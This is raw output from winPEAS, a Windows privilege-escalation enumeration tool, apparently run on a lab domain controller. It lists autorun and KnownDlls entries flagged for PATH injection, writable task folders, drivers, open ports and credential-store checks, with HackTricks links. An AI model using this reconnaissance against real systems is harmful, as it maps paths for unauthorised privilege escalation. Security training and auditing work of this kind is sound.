    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64base
    Folder: None (PATH Injection)
    File: wow64base.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64con
    Folder: None (PATH Injection)
    File: wow64con.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
    Key: StubPath
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\86.0.622.38\Installer
    File: C:\Program Files (x86)\Microsoft\Edge\Application\86.0.622.38\Installer\setup.exe --configure-user-settings --verbose-logging --system-level (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}                                                                                                             
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}                                                                                                             
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}                                                                                                    
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\86.0.622.38\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\86.0.622.38\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)                                                                                                       
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}                                                                                        
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\86.0.622.38\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\86.0.622.38\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)                                                                                                       
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                  

ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#vulnerable-drivers                                                                     
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys                                                                                                                 
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbd0a.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys                                                                                                             
    QLogic FastLinQ Ethernet - 8.45.1.103 [Marvell Semiconductor Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qevbda.sys                                                                                                         
    QLogic 10 GigE - 7.13.171.102 [Marvell Semiconductor Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys                                                                                                                  
    VMware vSockets Service - 9.8.19.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys                                                                                                            
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys                                                                                                          
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys                                                                                                      
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys                                                                                                               
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys                                                                                                               
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys                                                                                                                
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys                                                                                            
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys                                                                                                     
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys                                                                                                       
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys                                                                                                       
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys                                                                                                    
    MEGASAS2i RAID Controller Driver for Windows - 6.714.22.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys                                                                                         
    MEGASAS RAID Controller Driver for Windows - 7.716.02.00 [Broadcom Inc]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys                                                                                                
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys                                                                                                           
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Broadcom Limited]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mpi3drvi.sys                                                                                                       
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys                                                                                                      
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys                                                                                                             
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys                                                                                           
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys                                                                                           
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys                                                                                        
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys                                                                                           
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys                                                                                                       
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys                                                                                                  
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys                                                                                      
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1015 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys                                                                                     
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys                                                                          
    Emulex WS2K12 Storport Miniport Driver x64 - 12.6.165.8000 12/07/2019 WS2K12 64 bit x64 [Broadcom]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys                                                                        
    QLogic iSCSI offload driver - 8.42.2.101 [Marvell Semiconductor Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qeois.sys                                                                                                       
    QLogic Fibre Channel Stor Miniport Driver - 9.4.2.103 [Marvell Semiconductor Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys                                                                                        
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys                                                                                              
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys                                                                                                    
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys                                                                                           
    VMware PVSCSI StorPort driver (64-bit) - 1.3.26.0 build-20953372 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\pvscsi.sys                                                                                            
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys                                                                                       
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.1.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys                                                                                             
    QLogic FCoE offload driver - 8.42.1.101 [Marvell Semiconductor Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qefcoe.sys                                                                                                       
    QLogic iSCSI offload driver - 7.14.16.101 [Marvell Semiconductor Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys                                                                                                      
    QLogic FCoE Offload driver - 7.14.22.101 [Marvell Semiconductor Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys                                                                                                      
    VMware Pointing USB Device Driver - 12.5.12.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmusbmouse.sys                                                                                            
    VMware Pointing PS/2 Device Driver - 12.5.12.0 build-18967789 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys                                                                                              
    VMware SVGA 3D - 9.17.07.0004 - build-23707962 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys                                                                                                       
    VMware SVGA 3D - 9.17.07.0004 - build-23707962 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys                                                                                                              
    VMware PCIe Ethernet Adapter NDIS 6.85 (64-bit) - 1.9.14.0 build-22347299 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys                                                                                  
    VMware Raw Disk Helper Driver - 1.1.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmrawdsk.sys                                                                                                    
    VMware server memory controller - 7.5.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys                                                                                                  


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
È The masks are only for the IPv4 addresses 
    Ethernet0 2[00:50:56:94:E1:06]: 10.129.29.61 / 255.255.0.0
        Gateways: 10.129.0.1
        DNSs: 127.0.0.1
        Known hosts:
          10.129.0.1            00-50-56-B9-74-37     Dynamic
          10.129.26.240         00-50-56-94-6E-AC     Dynamic
          10.129.27.57          00-50-56-94-14-BB     Dynamic
          10.129.27.94          00-50-56-94-4C-B7     Dynamic
          10.129.27.119         00-50-56-94-A4-4A     Dynamic
          10.129.28.154         00-50-56-94-C8-31     Dynamic
          10.129.28.186         00-50-56-94-44-3D     Dynamic
          10.129.28.222         00-50-56-94-E3-C6     Dynamic
          10.129.28.239         00-50-56-94-BA-D0     Dynamic
          10.129.28.242         00-50-56-94-0A-46     Dynamic
          10.129.30.188         00-50-56-94-07-C8     Dynamic
          10.129.35.9           00-50-56-94-05-1C     Dynamic
          10.129.37.10          00-50-56-94-D8-D4     Dynamic
          10.129.55.171         00-50-56-94-C2-13     Dynamic
          10.129.57.113         00-50-56-94-C7-30     Dynamic
          10.129.58.53          00-50-56-94-38-84     Dynamic
          10.129.73.197         00-50-56-94-05-D0     Dynamic
          10.129.87.102         00-50-56-94-2D-63     Dynamic
          10.129.93.149         00-50-56-94-9A-73     Dynamic
          10.129.103.220        00-50-56-94-84-70     Dynamic
          10.129.108.40         00-50-56-94-E0-CF     Dynamic
          10.129.112.225        00-50-56-94-70-8B     Dynamic
          10.129.120.76         00-50-56-94-5B-49     Dynamic
          10.129.129.179        00-50-56-94-74-8C     Dynamic
          10.129.134.103        00-50-56-94-F9-F0     Dynamic
          10.129.136.48         00-50-56-94-AA-1B     Dynamic
          10.129.137.41         00-50-56-94-B7-DE     Dynamic
          10.129.165.227        00-50-56-94-61-52     Dynamic
          10.129.167.30         00-50-56-94-97-BE     Dynamic
          10.129.175.91         00-50-56-94-BB-22     Dynamic
          10.129.203.249        00-50-56-94-E1-01     Dynamic
          10.129.227.113        00-50-56-94-7C-46     Dynamic
          10.129.231.205        00-50-56-94-4E-C7     Dynamic
          10.129.232.88         00-50-56-94-1D-DF     Dynamic
          10.129.232.96         00-50-56-94-12-15     Dynamic
          10.129.232.128        00-50-56-94-64-23     Dynamic
          10.129.242.173        00-50-56-94-26-93     Dynamic
          10.129.243.199        00-50-56-94-B5-90     Dynamic
          10.129.255.255        FF-FF-FF-FF-FF-FF     Static
          169.254.255.255       00-00-00-00-00-00     Invalid
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          255.255.255.255       FF-FF-FF-FF-FF-FF     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                   
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         3856            httpd
  TCP        0.0.0.0               88            0.0.0.0               0               Listening         724             lsass
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         376             svchost
  TCP        0.0.0.0               389           0.0.0.0               0               Listening         724             lsass
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               464           0.0.0.0               0               Listening         724             lsass
  TCP        0.0.0.0               593           0.0.0.0               0               Listening         376             svchost
  TCP        0.0.0.0               636           0.0.0.0               0               Listening         724             lsass
  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         724             lsass
  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         724             lsass
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         944             svchost
  TCP        0.0.0.0               5986          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               6556          0.0.0.0               0               Listening         3836            cmk-agent-ctl
  TCP        0.0.0.0               9389          0.0.0.0               0               Listening         1444            Microsoft.ActiveDirectory.WebServices
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         724             lsass
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         560             wininit
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1260            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1668            svchost
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         2156            svchost
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         724             lsass
  TCP        0.0.0.0               49671         0.0.0.0               0               Listening         724             lsass
  TCP        0.0.0.0               59970         0.0.0.0               0               Listening         2144            dfsrs
  TCP        0.0.0.0               63552         0.0.0.0               0               Listening         724             lsass
  TCP        0.0.0.0               63557         0.0.0.0               0               Listening         704             services
  TCP        0.0.0.0               63571         0.0.0.0               0               Listening         2392            dns
  TCP        10.129.29.61          53            0.0.0.0               0               Listening         2392            dns
  TCP        10.129.29.61          139           0.0.0.0               0               Listening         4               System
  TCP        10.129.29.61          389           10.129.29.61          59963           Established       724             lsass
  TCP        10.129.29.61          389           10.129.29.61          59967           Established       724             lsass
  TCP        10.129.29.61          389           10.129.29.61          63597           Established       724             lsass
  TCP        10.129.29.61          5986          10.10.16.53           45050           Established       4               System

  Enumerating IPv6 connections
                                                                                                                   
  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        80            [::]                                        0               Listening         3856            httpd
  TCP        [::]                                        88            [::]                                        0               Listening         724             lsass
  TCP        [::]                                        135           [::]                                        0               Listening         376             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        464           [::]                                        0               Listening         724             lsass
  TCP        [::]                                        593           [::]                                        0               Listening         376             svchost
  TCP        [::]                                        3389          [::]                                        0               Listening         944             svchost
  TCP        [::]                                        5986          [::]                                        0               Listening         4               System
  TCP        [::]                                        6556          [::]                                        0               Listening         3836            cmk-agent-ctl
  TCP        [::]                                        9389          [::]                                        0               Listening         1444            Microsoft.ActiveDirectory.WebServices
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         724             lsass
  TCP        [::]                                        49665         [::]                                        0               Listening         560             wininit
  TCP        [::]                                        49666         [::]                                        0               Listening         1260            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         1668            svchost
  TCP        [::]                                        49668         [::]                                        0               Listening         2156            svchost
  TCP        [::]                                        49669         [::]                                        0               Listening         724             lsass
  TCP        [::]                                        49671         [::]                                        0               Listening         724             lsass
  TCP        [::]                                        59970         [::]                                        0               Listening         2144            dfsrs
  TCP        [::]                                        63552         [::]                                        0               Listening         724             lsass
  TCP        [::]                                        63557         [::]                                        0               Listening         704             services
  TCP        [::]                                        63571         [::]                                        0               Listening         2392            dns
  TCP        [::1]                                       53            [::]                                        0               Listening         2392            dns
  TCP        [::1]                                       135           [::1]                                       56661           Established       376             svchost
  TCP        [::1]                                       49669         [::1]                                       56663           Established       724             lsass
  TCP        [::1]                                       49669         [::1]                                       59253           Established       724             lsass
  TCP        [::1]                                       49669         [::1]                                       59982           Established       724             lsass
  TCP        [::1]                                       56661         [::1]                                       135             Established       724             lsass
  TCP        [::1]                                       56663         [::1]                                       49669           Established       724             lsass

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                   
  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            1112              svchost
  UDP        0.0.0.0               389           *:*                            724               lsass
  UDP        0.0.0.0               500           *:*                            2044              svchost
  UDP        0.0.0.0               3389          *:*                            944               svchost
  UDP        0.0.0.0               4500          *:*                            2044              svchost
  UDP        0.0.0.0               5353          *:*                            1216              svchost
  UDP        0.0.0.0               5355          *:*                            1216              svchost
  UDP        0.0.0.0               49476         *:*                            1216              svchost
  UDP        0.0.0.0               63430         *:*                            1216              svchost
  UDP        0.0.0.0               64266         *:*                            1216              svchost
  UDP        10.129.29.61          88            *:*                            724               lsass
  UDP        10.129.29.61          137           *:*                            4                 System
  UDP        10.129.29.61          138           *:*                            4                 System
  UDP        10.129.29.61          464           *:*                            724               lsass
  UDP        127.0.0.1             49409         *:*                            4488              WmiPrvSE
  UDP        127.0.0.1             50193         *:*                            5372              C:\Users\monitoring_svc\Downloads\winPEASx64.exe
  UDP        127.0.0.1             50454         *:*                            1508              svchost
  UDP        127.0.0.1             51980         *:*                            2144              dfsrs
  UDP        127.0.0.1             54317         *:*                            1468              svchost
  UDP        127.0.0.1             56979         *:*                            1444              Microsoft.ActiveDirectory.WebServices
  UDP        127.0.0.1             60925         *:*                            2316              ismserv

  Enumerating IPv6 connections
                                                                                                                   
  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            1112              svchost
  UDP        [::]                                        500           *:*                            2044              svchost
  UDP        [::]                                        3389          *:*                            944               svchost
  UDP        [::]                                        4500          *:*                            2044              svchost
  UDP        [::]                                        63430         *:*                            1216              svchost
  UDP        [::]                                        64266         *:*                            1216              svchost

ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
È Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
    Entry                                 Name                                  Data
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        CertificateRevocation                     1
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           10240
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps                                                                                                        
  No URLs configured

  Zone Auth Settings                                                                                               
  No Zone Auth Settings


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault                                                                                                                 
  [ERROR] Unable to enumerate vaults. Error (0x1061)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
